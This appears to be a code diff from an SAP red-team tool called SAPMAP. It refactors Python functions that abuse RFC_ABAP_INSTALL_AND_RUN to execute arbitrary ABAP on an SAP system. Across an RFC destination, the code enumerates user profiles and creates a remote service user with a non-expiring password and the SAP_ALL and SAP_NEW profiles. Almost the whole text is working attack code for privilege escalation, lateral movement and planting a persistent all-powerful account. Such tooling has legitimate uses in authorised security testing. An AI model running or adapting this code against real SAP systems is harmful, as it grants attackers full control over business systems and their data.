@@ -203,13 +203,13 @@ def _abap_install_and_run(conn, destination: str, username: str) -> dict:
 
     Returns dict with: profiles, has_sap_all, error.
     """
-    # Build ABAP source lines
     abap_lines = [
         "REPORT zsapmap.",
         "DATA: t_profiles TYPE TABLE OF bapiprof,",
         "      l_profiles LIKE LINE OF t_profiles,",
         "      t_roles    TYPE TABLE OF bapiagr.",
-        f"CALL FUNCTION 'BAPI_USER_GET_DETAIL' DESTINATION '{destination}'",
+        "CALL FUNCTION 'BAPI_USER_GET_DETAIL'",
+        f"  DESTINATION '{destination}'",
         "  EXPORTING",
         f"    username       = '{username}'",
         "  TABLES",
@@ -219,58 +219,21 @@ def _abap_install_and_run(conn, destination: str, username: str) -> dict:
         "  WRITE: / l_profiles-bapiprof.",
         "ENDLOOP.",
     ]
-    program_table = [{"LINE": line} for line in abap_lines]
 
-    # Determine which FM is available via FUNCTION_EXISTS
-    fm_name = None
-    for candidate in ("RFC_ABAP_INSTALL_AND_RUN", "/SAPDS/RFC_ABAP_INSTALL_RUN"):
-        try:
-            fe_result = conn.call("FUNCTION_EXISTS", FUNCNAME=candidate)
-            # If no exception, the FM exists
-            fm_name = candidate
-            break
-        except Exception:
-            continue
-    if not fm_name:
+    run = _run_abap_program(conn, abap_lines, "ZSAPMAP")
+    if not run["success"]:
         return {
             "profiles": [],
             "has_sap_all": False,
-            "error": "Neither RFC_ABAP_INSTALL_AND_RUN nor /SAPDS/RFC_ABAP_INSTALL_RUN available",
+            "error": run["error"],
         }
 
-    try:
-        result = conn.call(
-            fm_name,
-            PROGRAMNAME="ZSAPMAP",
-            MODE="F",
-            PROGRAM=program_table,
-        )
-        # Parse WRITES table — each row contains a profile name
-        writes = result.get("WRITES", [])
-        profiles = []
-        for row in writes:
-            line = ""
-            if isinstance(row, dict):
-                # WRITES structure field is ZEILE
-                line = (row.get("ZEILE", "") or
-                        row.get("ZEESSION", "") or
-                        row.get("LINE", "") or
-                        row.get("WA", "")).strip()
-            elif isinstance(row, str):
-                line = row.strip()
-            if line:
-                profiles.append(line)
-        return {
-            "profiles": profiles,
-            "has_sap_all": "SAP_ALL" in profiles,
-            "error": "",
-        }
-    except Exception as e:
-        return {
-            "profiles": [],
-            "has_sap_all": False,
-            "error": f"{fm_name} failed: {e}",
-        }
+    profiles = run["output"]
+    return {
+        "profiles": profiles,
+        "has_sap_all": "SAP_ALL" in profiles,
+        "error": "",
+    }
 
 
 def get_remote_user_profiles(node: SAPNode, username: str,
@@ -386,6 +349,64 @@ def create_user_via_bapi(node: SAPNode, username: str, password: str,
 # Create user on REMOTE system via ABAP_INSTALL_AND_RUN + DESTINATION
 # ---------------------------------------------------------------------------
 
+def _run_abap_program(conn, abap_lines: list, program_name: str = "ZSAPMAP") -> dict:
+    """Run an ABAP program via RFC_ABAP_INSTALL_AND_RUN or /SAPDS variant.
+
+    Shared helper that handles FM detection and output parsing.
+    Returns dict with: success, output (list of strings), error, fm_name.
+    """
+    program_table = [{"LINE": line} for line in abap_lines]
+
+    # Determine which FM is available
+    fm_name = None
+    for candidate in ("RFC_ABAP_INSTALL_AND_RUN",
+                      "/SAPDS/RFC_ABAP_INSTALL_RUN"):
+        try:
+            conn.call("FUNCTION_EXISTS", FUNCNAME=candidate)
+            fm_name = candidate
+            break
+        except Exception:
+            continue
+
+    if not fm_name:
+        return {
+            "success": False, "output": [], "fm_name": None,
+            "error": "Neither RFC_ABAP_INSTALL_AND_RUN nor "
+                     "/SAPDS/RFC_ABAP_INSTALL_RUN available",
+        }
+
+    try:
+        run_result = conn.call(
+            fm_name,
+            PROGRAMNAME=program_name,
+            MODE="F",
+            PROGRAM=program_table,
+        )
+
+        # Parse WRITES output
+        writes = run_result.get("WRITES", [])
+        output_lines = []
+        for row in writes:
+            line = ""
+            if isinstance(row, dict):
+                line = (row.get("ZEILE", "") or row.get("LINE", "") or
+                        row.get("WA", "")).strip()
+            elif isinstance(row, str):
+                line = row.strip()
+            if line:
+                output_lines.append(line)
+
+        return {
+            "success": True, "output": output_lines,
+            "fm_name": fm_name, "error": "",
+        }
+    except Exception as e:
+        return {
+            "success": False, "output": [],
+            "fm_name": fm_name, "error": str(e),
+        }
+
+
 def create_user_via_destination(node: SAPNode, destination: str,
                                  username: str, password: str,
                                  creds: Credentials = None) -> dict:
@@ -396,119 +417,100 @@ def create_user_via_destination(node: SAPNode, destination: str,
     system.  The BAPIs execute on the TARGET system through the RFC
     connection.
 
-    This avoids the need for direct credentials on the target — only
-    credentials on the source system + a working RFC destination with
-    SAP_ALL are required.
-
     Returns dict with: success, message, username
     """
     result = {"success": False, "message": "", "username": username}
 
+    # Keep all ABAP lines under 72 chars (PROGRAM table LINE width)
+    # Use short variable names: d=destination
+    d = destination
+    u = username
+    p = password
+
     abap_lines = [
-        "REPORT zsapmap_create.",
-        "DATA: lv_return TYPE bapiret2,",
-        "      lt_return TYPE TABLE OF bapiret2,",
-        "      ls_password TYPE bapipwd,",
-        "      ls_logondata TYPE bapilogond,",
-        "      ls_address TYPE bapiaddr3,",
-        "      lt_profiles TYPE TABLE OF bapiprof,",
-        "      ls_profile TYPE bapiprof.",
-        f"ls_password-bapipwd = '{password}'.",
-        "ls_logondata-ustyp = 'S'.",
-        "ls_logondata-gltgb = '99991231'.",
-        "ls_address-firstname = 'SAPMAP'.",
-        "ls_address-lastname = 'Security'.",
-        "ls_address-function = 'SAPMAP Red Team'.",
-        f"CALL FUNCTION 'BAPI_USER_CREATE1' DESTINATION '{destination}'",
+        "REPORT zsapm.",
+        "DATA: rv TYPE bapiret2,",
+        "      rt TYPE TABLE OF bapiret2,",
+        "      pw TYPE bapipwd,",
+        "      lo TYPE bapilogond,",
+        "      ad TYPE bapiaddr3,",
+        "      pt TYPE TABLE OF bapiprof,",
+        "      ps TYPE bapiprof.",
+        f"pw-bapipwd = '{p}'.",
+        "lo-ustyp = 'S'.",
+        "lo-gltgb = '99991231'.",
+        "ad-firstname = 'SAPMAP'.",
+        "ad-lastname = 'Security'.",
+        f"CALL FUNCTION 'BAPI_USER_CREATE1'",
+        f"  DESTINATION '{d}'",
         "  EXPORTING",
-        f"    username  = '{username}'",
-        "    password  = ls_password",
-        "    logondata = ls_logondata",
-        "    address   = ls_address",
+        f"    username  = '{u}'",
+        "    password  = pw",
+        "    logondata = lo",
+        "    address   = ad",
         "  IMPORTING",
-        "    return    = lv_return.",
-        "IF lv_return-type CA 'EA'.",
-        "  WRITE: / 'ERROR:', lv_return-message.",
+        "    return    = rv.",
+        "IF rv-type CA 'EA'.",
+        "  WRITE: / 'ERR:', rv-message.",
         "ELSE.",
         "  WRITE: / 'USER_CREATED'.",
-        "  ls_profile-bapiprof = 'SAP_ALL'.",
-        "  APPEND ls_profile TO lt_profiles.",
-        "  ls_profile-bapiprof = 'SAP_NEW'.",
-        "  APPEND ls_profile TO lt_profiles.",
-        f"  CALL FUNCTION 'BAPI_USER_PROFILES_ASSIGN' DESTINATION '{destination}'",
+        "  ps-bapiprof = 'SAP_ALL'.",
+        "  APPEND ps TO pt.",
+        "  ps-bapiprof = 'SAP_NEW'.",
+        "  APPEND ps TO pt.",
+        "  CALL FUNCTION",
+        "    'BAPI_USER_PROFILES_ASSIGN'",
+        f"    DESTINATION '{d}'",
         "    EXPORTING",
-        f"      username = '{username}'",
+        f"      username = '{u}'",
         "    TABLES",
-        "      profiles = lt_profiles",
-        "      return   = lt_return.",
-        "  WRITE: / 'SAP_ALL_ASSIGNED'.",
+        "      profiles = pt",
+        "      return   = rt.",
+        "  WRITE: / 'SAP_ALL_OK'.",
         "ENDIF.",
     ]
-    program_table = [{"LINE": line} for line in abap_lines]
 
     try:
         with _get_connection(node, creds) as conn:
-            # Find available ABAP_INSTALL_AND_RUN FM
-            fm_name = None
-            for candidate in ("RFC_ABAP_INSTALL_AND_RUN",
-                              "/SAPDS/RFC_ABAP_INSTALL_RUN"):
-                try:
-                    conn.call("FUNCTION_EXISTS", FUNCNAME=candidate)
-                    fm_name = candidate
-                    break
-                except Exception:
-                    continue
+            print(f"[*] Running BAPI_USER_CREATE1 via "
+                  f"ABAP_INSTALL_AND_RUN DESTINATION '{d}'...")
+            run = _run_abap_program(conn, abap_lines, "ZSAPM")
 
-            if not fm_name:
-                result["message"] = ("Neither RFC_ABAP_INSTALL_AND_RUN nor "
-                                     "/SAPDS/RFC_ABAP_INSTALL_RUN available")
-                print(f"[-] {result['message']}")
+            if not run["success"]:
+                result["message"] = run["error"]
+                print(f"[-] {run['error']}")
                 return result
 
-            print(f"[*] Running BAPI_USER_CREATE1 via {fm_name} "
-                  f"DESTINATION '{destination}'...")
-            run_result = conn.call(
-                fm_name,
-                PROGRAMNAME="ZSAPMAP_CREATE",
-                MODE="F",
-                PROGRAM=program_table,
-            )
+            print(f"[*] Used FM: {run['fm_name']}")
+            output = run["output"]
+            for line in output:
+                print(f"    ABAP output: {line}")
 
-            # Parse WRITES output
-            writes = run_result.get("WRITES", [])
-            output_lines = []
-            for row in writes:
-                line = ""
-                if isinstance(row, dict):
-                    line = (row.get("ZEILE", "") or row.get("LINE", "") or
-                            row.get("WA", "")).strip()
-                elif isinstance(row, str):
-                    line = row.strip()
-                if line:
-                    output_lines.append(line)
-
-            if any("USER_CREATED" in l for l in output_lines):
+            if any("USER_CREATED" in l for l in output):
                 result["success"] = True
-                result["message"] = f"User {username} created with SAP_ALL via DESTINATION"
-                if any("SAP_ALL_ASSIGNED" in l for l in output_lines):
-                    print(f"[+] User {username} created and SAP_ALL assigned "
-                          f"on remote system via {destination}")
+                if any("SAP_ALL_OK" in l for l in output):
+                    result["message"] = (f"User {u} created with "
+                                         f"SAP_ALL via DESTINATION")
+                    print(f"[+] User {u} created and SAP_ALL "
+                          f"assigned on remote system via {d}")
                 else:
-                    print(f"[+] User {username} created on remote system "
-                          f"via {destination} (SAP_ALL assignment uncertain)")
+                    result["message"] = (f"User {u} created via "
+                                         f"DESTINATION (SAP_ALL uncertain)")
+                    print(f"[+] User {u} created on remote system "
+                          f"via {d} (SAP_ALL uncertain)")
             else:
-                error_lines = [l for l in output_lines if "ERROR" in l]
-                if error_lines:
-                    result["message"] = error_lines[0]
-                    print(f"[-] Remote user creation failed: {error_lines[0]}")
+                err = [l for l in output if "ERR:" in l]
+                if err:
+                    result["message"] = err[0]
+                    print(f"[-] Remote user creation: {err[0]}")
                 else:
-                    result["message"] = f"Unexpected output: {output_lines}"
-                    print(f"[-] Remote user creation: unexpected output: "
-                          f"{output_lines}")
+                    result["message"] = (f"Unexpected output: "
+                                         f"{output}")
+                    print(f"[-] Unexpected output: {output}")
 
     except Exception as e:
         result["message"] = str(e)
-        logger.error(f"Remote user creation via DESTINATION failed: {e}")
+        logger.error(f"Remote user creation via DESTINATION: {e}")
         print(f"[-] Remote user creation error: {e}")
 
     return result
